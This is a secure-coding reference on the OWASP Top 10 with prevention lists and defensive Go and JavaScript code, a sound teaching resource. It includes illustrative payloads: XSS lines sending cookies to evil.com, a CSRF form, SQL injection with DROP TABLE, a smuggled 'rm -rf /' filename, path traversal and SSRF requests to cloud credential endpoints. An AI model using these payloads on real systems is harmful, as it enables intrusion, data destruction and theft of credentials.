# Security OWASP

## What is OWASP
```
overview:
  full_name: Open Web Application Security Project
  description: |
    Non-profit foundation that produces guidelines, tools, and documentation
    for web application security. The OWASP Top 10 is the most widely
    referenced list of critical web security risks.
  owasp_top_10_2021:
    - A01 Broken Access Control
    - A02 Cryptographic Failures
    - A03 Injection
    - A04 Insecure Design
    - A05 Security Misconfiguration
    - A06 Vulnerable and Outdated Components
    - A07 Identification and Authentication Failures
    - A08 Software and Data Integrity Failures
    - A09 Security Logging and Monitoring Failures
    - A10 Server-Side Request Forgery (SSRF)
```

## A01 - Broken Access Control
```
broken_access_control:

  what_it_is: |
    Users can act outside their intended permissions.
    Most common web vulnerability - 94% of apps tested had some form.

  attack_examples:
    idor: |
      # Insecure Direct Object Reference
      # User 1 changes URL to access User 2's data
      GET /api/users/2/profile    # Should only allow own profile
      GET /api/orders/5678        # Accessing someone else's order

    privilege_escalation: |
      # Normal user accesses admin endpoints
      POST /api/admin/delete-user
      # Or modifies role in request body
      POST /api/register { "role": "admin" }

    path_traversal: |
      GET /files/../../../etc/passwd

  prevention:
    - "Deny by default - require explicit grants"
    - "Check authorization on EVERY request, not just UI"
    - "Validate object ownership (does this user own this resource?)"
    - "Use role-based access control (RBAC)"
    - "Rate limit API and controller access"
    - "Log access control failures and alert"
    - "Disable directory listing on web server"
```

## A02 - Cryptographic Failures
```
cryptographic_failures:

  what_it_is: |
    Failures related to cryptography that expose sensitive data.
    Previously called "Sensitive Data Exposure".

  common_failures:
    - Transmitting data in cleartext (HTTP, FTP, SMTP)
    - Using weak/deprecated algorithms (MD5, SHA1, DES)
    - Storing passwords as plaintext or simple hashes
    - Using default or weak encryption keys
    - Not enforcing HTTPS everywhere
    - Missing HSTS header

  prevention:
    passwords: "Always use bcrypt, scrypt, or argon2 - never MD5/SHA"
    transport: "Enforce HTTPS everywhere with HSTS header"
    at_rest: "Encrypt sensitive data in database (AES-256)"
    keys: "Rotate encryption keys, store in secrets manager"
    headers: |
      Strict-Transport-Security: max-age=31536000; includeSubDomains
```

## A03 - Injection
```
injection:

  what_it_is: |
    Untrusted data is sent to an interpreter as part of a command or query.
    Attacker's hostile data tricks the interpreter into executing unintended
    commands or accessing unauthorized data.

  types:
    sql_injection:
      attack: |
        -- User input: ' OR '1'='1' --
        SELECT * FROM users WHERE email = '' OR '1'='1' --' AND password = 'x'
        -- Returns ALL users

        -- User input: '; DROP TABLE users; --
        SELECT * FROM users WHERE id = ''; DROP TABLE users; --'
      severity: Can read, modify, or delete entire database

    nosql_injection:
      attack: |
        // User sends: { "email": {"$gt": ""}, "password": {"$gt": ""} }
        db.users.findOne({ email: {"$gt": ""}, password: {"$gt": ""} })
        // Returns first user in collection

    command_injection:
      attack: |
        // User input for filename: "file.txt; rm -rf /"
        exec("cat " + userInput)
        // Executes: cat file.txt; rm -rf /

    ldap_injection:
      attack: "User input: *)(uid=*))(|(uid=*"

  prevention:
    primary: "Use parameterized queries / prepared statements ALWAYS"
    secondary:
      - "Input validation (allowlists over denylists)"
      - "Escape special characters as last resort"
      - "Use ORM with parameterized queries"
      - "Apply principle of least privilege to DB accounts"
      - "Use stored procedures (still parameterize inputs)"
```

## A04 - Insecure Design
```
insecure_design:

  what_it_is: |
    Flaws in the design and architecture of an application,
    not just implementation bugs. No amount of good code
    fixes a fundamentally insecure design.

  examples:
    - "Password recovery that asks security questions (answers are guessable)"
    - "No rate limiting on login or password reset"
    - "Storing credit card numbers when you only need a token"
    - "Trusting client-side validation without server-side checks"
    - "Not having threat modeling during design phase"

  prevention:
    - "Use threat modeling (STRIDE, DREAD)"
    - "Establish secure design patterns and reference architecture"
    - "Limit resource consumption per user/session"
    - "Design with defense in depth"
    - "Separate tenants at infrastructure level"
    - "Write abuse cases alongside use cases"
```

## A05 - Security Misconfiguration
```
security_misconfiguration:

  what_it_is: |
    Insecure default configurations, incomplete setups, open cloud storage,
    misconfigured HTTP headers, verbose error messages with sensitive info.

  common_issues:
    - "Default credentials left unchanged (admin/admin)"
    - "Unnecessary features enabled (debug mode in production)"
    - "Stack traces exposed to users"
    - "Directory listing enabled on web server"
    - "Missing security headers"
    - "S3 buckets publicly accessible"
    - "Outdated software with known vulnerabilities"

  essential_http_headers: |
    Content-Security-Policy: default-src 'self'; script-src 'self'
    X-Content-Type-Options: nosniff
    X-Frame-Options: DENY
    X-XSS-Protection: 0    # deprecated, use CSP instead
    Strict-Transport-Security: max-age=31536000; includeSubDomains
    Referrer-Policy: strict-origin-when-cross-origin
    Permissions-Policy: camera=(), microphone=(), geolocation=()

  prevention:
    - "Automate hardening with infrastructure as code"
    - "Remove unused features, frameworks, dependencies"
    - "Review and update configurations regularly"
    - "Use different credentials for each environment"
    - "Send security headers on all responses"
    - "Run security scanning tools in CI/CD"
```

## A06 - Vulnerable Components
```
vulnerable_components:

  what_it_is: |
    Using libraries, frameworks, or other software modules with known
    vulnerabilities. Supply chain attacks target dependencies.

  real_examples:
    - "Log4Shell (CVE-2021-44228) - Log4j RCE"
    - "event-stream npm package - cryptocurrency theft"
    - "SolarWinds supply chain attack"

  prevention:
    - "Remove unused dependencies"
    - "Track versions of all components (SBOM)"
    - "Monitor CVE databases (NVD, GitHub Advisories)"
    - "Use automated dependency scanning in CI/CD"
    - "Pin dependency versions, review updates"
    - "Only use components from trusted sources"

  tools:
    go: "govulncheck, nancy"
    javascript: "npm audit, snyk, dependabot"
    general: "Trivy, Grype, OWASP Dependency-Check"
```

## A07 - Authentication Failures
```
authentication_failures:

  what_it_is: |
    Weaknesses in authentication mechanisms that allow attackers
    to compromise passwords, keys, session tokens, or assume
    other users' identities.

  common_issues:
    - "Permits brute force or credential stuffing"
    - "Allows weak or well-known passwords"
    - "Uses plaintext or weak password storage"
    - "Missing or broken multi-factor authentication"
    - "Session IDs in URLs"
    - "Sessions not invalidated on logout"
    - "Session tokens not rotated after login"

  prevention:
    password_storage: "bcrypt with cost factor 12+ (never MD5/SHA)"
    multi_factor: "Implement MFA for all sensitive operations"
    rate_limiting: "Lock account or add delay after 5 failed attempts"
    session_management:
      - "Generate new session ID on login"
      - "Invalidate session on logout and timeout"
      - "Use secure, httpOnly, sameSite cookies"
    password_policy:
      - "Minimum 8 characters"
      - "Check against breached password databases"
      - "Don't require complex rules (they cause weaker passwords)"
```

## A08 - Software Integrity Failures
```
software_integrity_failures:

  what_it_is: |
    Code and infrastructure that does not protect against integrity violations.
    Includes insecure deserialization and CI/CD pipeline attacks.

  insecure_deserialization:
    description: Accepting serialized objects from untrusted sources
    attack: |
      Attacker modifies serialized object to:
      - Escalate privileges (change role to admin)
      - Execute arbitrary code (object instantiation triggers commands)
      - Tamper with data (modify price in cart object)
    prevention:
      - "Don't accept serialized objects from untrusted sources"
      - "Use JSON instead of native serialization formats"
      - "Implement integrity checks (digital signatures)"
      - "Enforce strict type constraints during deserialization"
      - "Isolate deserialization in low-privilege environments"

  ci_cd_integrity:
    description: Ensure pipeline and artifacts are not tampered with
    prevention:
      - "Verify checksums/signatures of downloaded dependencies"
      - "Use lock files (package-lock.json, go.sum)"
      - "Protect CI/CD pipeline with access controls"
      - "Sign releases and verify signatures"

  jwt_tampering:
    attack: |
      Change algorithm from RS256 to "none"
      or from RS256 to HS256 (using public key as HMAC secret)
    prevention: "Always validate algorithm, never accept 'none'"
```

## A09 - Logging and Monitoring Failures
```
logging_monitoring_failures:

  what_it_is: |
    Without proper logging and monitoring, breaches cannot be detected.
    Average time to detect a breach: 200+ days.

  what_to_log:
    - "Authentication events (login, logout, failed attempts)"
    - "Authorization failures (access denied)"
    - "Input validation failures"
    - "Server-side errors (500s)"
    - "Changes to sensitive data"
    - "Admin actions"

  what_NOT_to_log:
    - "Passwords or secrets"
    - "Full credit card numbers"
    - "Session tokens"
    - "Personal health information"

  prevention:
    - "Log all access control and authentication events"
    - "Use structured logging (JSON) for easy parsing"
    - "Centralize logs (ELK stack, Grafana Loki, Datadog)"
    - "Set up alerts for suspicious patterns"
    - "Retain logs for sufficient time (90+ days)"
    - "Ensure logs cannot be tampered with"
    - "Create incident response plan"
```

## A10 - SSRF (Server-Side Request Forgery)
```
ssrf:

  what_it_is: |
    Application fetches a remote resource based on user-supplied URL
    without validation. Attacker makes server request internal resources.

  attack_examples:
    cloud_metadata: |
      # Access AWS metadata from inside the network
      GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/

    internal_services: |
      # Access internal services not exposed to internet
      GET /fetch?url=http://localhost:6379/     # Redis
      GET /fetch?url=http://internal-admin:8080/delete-all

    port_scanning: |
      # Scan internal network
      GET /fetch?url=http://192.168.1.1:22
      GET /fetch?url=http://192.168.1.1:3306

  prevention:
    - "Validate and sanitize ALL user-supplied URLs"
    - "Use allowlist of permitted domains/IPs"
    - "Block requests to private IP ranges (10.x, 172.16.x, 192.168.x, 169.254.x)"
    - "Don't send raw responses to client"
    - "Disable HTTP redirects or validate redirect targets"
    - "Use network-level controls (firewall, security groups)"
    - "AWS: use IMDSv2 (requires token for metadata)"
```

## XSS (Cross-Site Scripting)
```
xss:

  what_it_is: |
    Injecting malicious scripts into web pages viewed by other users.
    The script runs in the victim's browser with the site's privileges.

  types:
    reflected:
      description: Malicious script in the URL, reflected in response
      attack: |
        https://example.com/search?q=<script>document.location='http://evil.com/steal?c='+document.cookie</script>
      note: Requires victim to click a crafted link

    stored:
      description: Malicious script stored in database, served to all users
      attack: |
        Comment field: <script>fetch('http://evil.com/steal?c='+document.cookie)</script>
        Every user viewing the page executes the script
      note: Most dangerous, no user interaction needed after storage

    dom_based:
      description: Client-side JavaScript manipulates DOM with untrusted data
      attack: |
        // Vulnerable code
        document.getElementById('output').innerHTML = location.hash.slice(1);
        // URL: https://example.com/#<img src=x onerror=alert(1)>

  prevention:
    - "Escape output based on context (HTML, JS, URL, CSS)"
    - "Use Content-Security-Policy header"
    - "Set HttpOnly flag on session cookies (JS cannot access)"
    - "Use frameworks with auto-escaping (React, Go html/template)"
    - "Sanitize HTML input with allowlisted tags if rich text needed"
    - "Never use innerHTML with user data, use textContent"
```

## CSRF (Cross-Site Request Forgery)
```
csrf:

  what_it_is: |
    Tricks authenticated users into submitting requests they didn't intend.
    Exploits the browser's automatic sending of cookies with every request.

  attack_example: |
    <!-- On evil.com -->
    <form action="https://bank.com/transfer" method="POST" id="f">
      <input type="hidden" name="to" value="attacker_account" />
      <input type="hidden" name="amount" value="10000" />
    </form>
    <script>document.getElementById('f').submit();</script>
    <!-- User's browser sends bank.com cookies automatically -->

  prevention:
    csrf_tokens: |
      Generate random token per session, include in forms.
      Server validates token on every state-changing request.
    same_site_cookies: |
      Set-Cookie: session=abc123; SameSite=Strict; Secure; HttpOnly
      - Strict: never sent cross-site
      - Lax: sent on top-level navigations only (default in modern browsers)
    other:
      - "Verify Origin and Referer headers"
      - "Require re-authentication for sensitive actions"
      - "Use custom headers (X-Requested-With) for AJAX"
```

## Input Validation
```
input_validation:

  principles:
    - "Never trust user input - validate on server side"
    - "Allowlist (accept known good) over denylist (reject known bad)"
    - "Validate type, length, range, and format"
    - "Reject invalid input, don't try to fix it"

  strategies:
    type_checking: "Is the age field actually a number?"
    length_limits: "Name max 100 chars, email max 254 chars"
    format_validation: "Email matches RFC 5322, phone matches E.164"
    range_checking: "Age between 0 and 150, price > 0"
    allowlisting: "Status must be one of: active, inactive, pending"
    encoding: "Normalize Unicode before validation"

  common_bypasses_to_prevent:
    - "Null bytes: %00 can truncate strings in some languages"
    - "Unicode: different encodings of same character"
    - "Double encoding: %2527 -> %27 -> '"
    - "Case sensitivity: 'ADMIN' vs 'admin'"
```

## Password Hashing
```
password_hashing:

  never_use:
    - "Plaintext storage"
    - "MD5 (fast, broken, rainbow tables)"
    - "SHA-1 / SHA-256 without salt (too fast, rainbow tables)"
    - "Single iteration of any hash"

  recommended_algorithms:
    bcrypt:
      description: "Adaptive hash function, intentionally slow"
      cost_factor: "12+ (doubles time per increment)"
      max_password: "72 bytes"
      status: "Industry standard, widely supported"

    argon2:
      description: "Winner of Password Hashing Competition (2015)"
      variants:
        argon2id: "Recommended - hybrid of argon2i and argon2d"
      params: "memory=64MB, iterations=3, parallelism=4"
      status: "Modern recommendation, use if available"

    scrypt:
      description: "Memory-hard function, expensive to brute force"
      status: "Good alternative to bcrypt"

  key_principles:
    - "Always use a unique salt per password (bcrypt does this automatically)"
    - "Use work factor that takes ~250ms to compute"
    - "Increase work factor over time as hardware improves"
    - "Never log or expose password hashes"
```

## Go Security Examples
```go
package main

import (
    "crypto/rand"
    "database/sql"
    "encoding/hex"
    "fmt"
    "html/template"
    "log"
    "net"
    "net/http"
    "net/url"
    "regexp"
    "strings"

    "golang.org/x/crypto/bcrypt"
    _ "github.com/lib/pq"
)

// --- PASSWORD HASHING (bcrypt) ---

func hashPassword(password string) (string, error) {
    bytes, err := bcrypt.GenerateFromPassword([]byte(password), 12) // cost=12
    return string(bytes), err
}

func checkPassword(password, hash string) bool {
    err := bcrypt.CompareHashAndPassword([]byte(hash), []byte(password))
    return err == nil
}

// --- SQL INJECTION PREVENTION (parameterized queries) ---

func getUserSafe(db *sql.DB, email string) (*User, error) {
    var user User
    // SAFE: parameterized query
    err := db.QueryRow(
        "SELECT id, name, email FROM users WHERE email = $1", email,
    ).Scan(&user.ID, &user.Name, &user.Email)
    return &user, err
}

// UNSAFE - never do this:
// query := fmt.Sprintf("SELECT * FROM users WHERE email = '%s'", email)

// --- XSS PREVENTION (html/template auto-escapes) ---

func renderProfile(w http.ResponseWriter, r *http.Request) {
    tmpl := template.Must(template.ParseFiles("profile.html"))
    data := map[string]string{
        "Name": r.URL.Query().Get("name"), // auto-escaped by html/template
    }
    tmpl.Execute(w, data)
    // html/template escapes: <script> becomes &lt;script&gt;
}

// --- CSRF TOKEN ---

func generateCSRFToken() string {
    b := make([]byte, 32)
    rand.Read(b)
    return hex.EncodeToString(b)
}

func csrfMiddleware(next http.HandlerFunc) http.HandlerFunc {
    return func(w http.ResponseWriter, r *http.Request) {
        if r.Method == "POST" || r.Method == "PUT" || r.Method == "DELETE" {
            token := r.Header.Get("X-CSRF-Token")
            sessionToken := getSessionCSRF(r) // from session store
            if token == "" || token != sessionToken {
                http.Error(w, "Invalid CSRF token", http.StatusForbidden)
                return
            }
        }
        next(w, r)
    }
}

// --- SSRF PREVENTION ---

func isAllowedURL(rawURL string) bool {
    parsed, err := url.Parse(rawURL)
    if err != nil {
        return false
    }
    // Only allow HTTPS
    if parsed.Scheme != "https" {
        return false
    }
    // Resolve hostname to check for internal IPs
    ips, err := net.LookupIP(parsed.Hostname())
    if err != nil {
        return false
    }
    for _, ip := range ips {
        if ip.IsLoopback() || ip.IsPrivate() || ip.IsLinkLocalUnicast() {
            return false // Block internal IPs
        }
    }
    // Allowlist of permitted domains
    allowedDomains := []string{"api.example.com", "cdn.example.com"}
    for _, d := range allowedDomains {
        if parsed.Hostname() == d {
            return true
        }
    }
    return false
}

// --- INPUT VALIDATION ---

type User struct {
    ID    int
    Name  string
    Email string
}

var emailRegex = regexp.MustCompile(`^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$`)

func validateUserInput(name, email string) error {
    // Length checks
    if len(name) < 1 || len(name) > 100 {
        return fmt.Errorf("name must be 1-100 characters")
    }
    if len(email) < 5 || len(email) > 254 {
        return fmt.Errorf("email must be 5-254 characters")
    }
    // Format checks
    if !emailRegex.MatchString(email) {
        return fmt.Errorf("invalid email format")
    }
    // Reject null bytes
    if strings.Contains(name, "\x00") || strings.Contains(email, "\x00") {
        return fmt.Errorf("invalid characters in input")
    }
    return nil
}

// --- SECURITY HEADERS MIDDLEWARE ---

func securityHeaders(next http.Handler) http.Handler {
    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        w.Header().Set("Content-Security-Policy", "default-src 'self'; script-src 'self'")
        w.Header().Set("X-Content-Type-Options", "nosniff")
        w.Header().Set("X-Frame-Options", "DENY")
        w.Header().Set("Strict-Transport-Security", "max-age=31536000; includeSubDomains")
        w.Header().Set("Referrer-Policy", "strict-origin-when-cross-origin")
        w.Header().Set("Permissions-Policy", "camera=(), microphone=(), geolocation=()")
        next.ServeHTTP(w, r)
    })
}

func main() {
    // Password hashing example
    hash, _ := hashPassword("mySecurePassword123")
    log.Printf("Hash: %s", hash)
    log.Printf("Valid: %v", checkPassword("mySecurePassword123", hash))
    log.Printf("Invalid: %v", checkPassword("wrongPassword", hash))

    mux := http.NewServeMux()
    mux.HandleFunc("/profile", renderProfile)

    // Wrap with security headers
    log.Fatal(http.ListenAndServeTLS(":443", "cert.pem", "key.pem",
        securityHeaders(mux)))
}

func getSessionCSRF(r *http.Request) string {
    // Retrieve CSRF token from session store
    return "" // placeholder
}
```

## JavaScript Security Examples
```javascript
const express = require('express');
const bcrypt = require('bcrypt');
const crypto = require('crypto');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');
const { body, validationResult } = require('express-validator');
const { Pool } = require('pg');

const app = express();
app.use(express.json());

// --- SECURITY HEADERS (helmet sets all recommended headers) ---
app.use(helmet());
app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: ["'self'"],
    styleSrc: ["'self'"],
    imgSrc: ["'self'", 'data:'],
    connectSrc: ["'self'"],
    frameSrc: ["'none'"],
  },
}));

// --- RATE LIMITING ---
const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,   // 15 minutes
  max: 5,                      // 5 attempts per window
  message: { error: 'Too many login attempts, try again in 15 minutes' },
});

// --- PASSWORD HASHING (bcrypt) ---
async function hashPassword(password) {
  const saltRounds = 12;
  return bcrypt.hash(password, saltRounds);
}

async function verifyPassword(password, hash) {
  return bcrypt.compare(password, hash);
}

// --- SQL INJECTION PREVENTION (parameterized queries) ---
const pool = new Pool({ connectionString: 'postgres://localhost/mydb' });

async function getUserSafe(email) {
  // SAFE: parameterized query with $1 placeholder
  const { rows } = await pool.query(
    'SELECT id, name, email FROM users WHERE email = $1',
    [email]
  );
  return rows[0];
}

// UNSAFE - never do this:
// const query = `SELECT * FROM users WHERE email = '${email}'`;

// --- INPUT VALIDATION (express-validator) ---
app.post('/api/register',
  loginLimiter,
  body('name').trim().isLength({ min: 1, max: 100 }).escape(),
  body('email').isEmail().normalizeEmail(),
  body('password').isLength({ min: 8, max: 128 })
    .matches(/^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)/)
    .withMessage('Must contain upper, lower, and number'),
  async (req, res) => {
    const errors = validationResult(req);
    if (!errors.isEmpty()) {
      return res.status(400).json({ errors: errors.array() });
    }

    const { name, email, password } = req.body;
    const hash = await hashPassword(password);

    await pool.query(
      'INSERT INTO users (name, email, password_hash) VALUES ($1, $2, $3)',
      [name, email, hash]
    );
    res.status(201).json({ message: 'User created' });
  }
);

// --- CSRF TOKEN ---
function generateCSRFToken() {
  return crypto.randomBytes(32).toString('hex');
}

app.use((req, res, next) => {
  if (['POST', 'PUT', 'DELETE'].includes(req.method)) {
    const token = req.headers['x-csrf-token'];
    const sessionToken = req.session?.csrfToken;
    if (!token || token !== sessionToken) {
      return res.status(403).json({ error: 'Invalid CSRF token' });
    }
  }
  next();
});

// --- SECURE COOKIE SETTINGS ---
app.use(require('express-session')({
  secret: crypto.randomBytes(64).toString('hex'),
  resave: false,
  saveUninitialized: false,
  cookie: {
    httpOnly: true,     // JS cannot access cookie
    secure: true,       // HTTPS only
    sameSite: 'strict', // no cross-site sending
    maxAge: 3600000,    // 1 hour
  },
}));

// --- SSRF PREVENTION ---
const allowedDomains = ['api.example.com', 'cdn.example.com'];

function isAllowedURL(rawURL) {
  try {
    const parsed = new URL(rawURL);
    if (parsed.protocol !== 'https:') return false;
    if (!allowedDomains.includes(parsed.hostname)) return false;
    // Block internal IPs
    const ip = parsed.hostname;
    if (ip.startsWith('10.') || ip.startsWith('192.168.') ||
        ip.startsWith('172.') || ip === 'localhost' ||
        ip === '127.0.0.1' || ip.startsWith('169.254.')) {
      return false;
    }
    return true;
  } catch {
    return false;
  }
}

app.listen(3000, () => console.log('Server on :3000'));
```

## Best Practices
```
best_practices:

  defense_in_depth:
    - "Multiple layers of security (don't rely on one control)"
    - "Validate on client AND server"
    - "Encrypt in transit AND at rest"
    - "Authenticate AND authorize every request"

  secure_defaults:
    - "Deny by default, explicitly allow"
    - "Use security-focused libraries (helmet, csrf, bcrypt)"
    - "Keep dependencies updated and scanned"
    - "Use HTTPS everywhere, redirect HTTP to HTTPS"

  development_practices:
    - "Run SAST/DAST tools in CI/CD pipeline"
    - "Conduct code reviews with security focus"
    - "Use pre-commit hooks for secret detection"
    - "Never commit secrets to git (.env, API keys)"
    - "Use environment variables or secrets manager"

  incident_response:
    - "Log all security-relevant events"
    - "Set up alerts for anomalies"
    - "Have an incident response plan"
    - "Practice breach scenarios"
    - "Rotate compromised credentials immediately"

  checklist_per_endpoint:
    - "Authentication required?"
    - "Authorization checked (RBAC)?"
    - "Input validated and sanitized?"
    - "Output encoded for context?"
    - "Rate limited?"
    - "CSRF protected (state-changing)?"
    - "Sensitive data not logged?"
```
